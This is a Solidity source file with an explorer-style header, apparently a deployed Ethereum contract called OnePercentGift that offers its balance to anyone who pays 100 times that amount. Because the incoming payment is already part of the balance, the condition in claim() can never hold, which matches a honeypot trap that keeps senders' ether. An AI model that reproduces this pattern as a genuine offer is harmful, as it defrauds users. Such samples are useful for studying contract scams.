
//Address: 0xb0d9473a71dfafc80df8de7f45a012ef5b33c6fd
//Contract name: OnePercentGift
//Balance: 0 Ether
//Verification Date: 4/9/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{
        
	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value + address(this).balance);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}
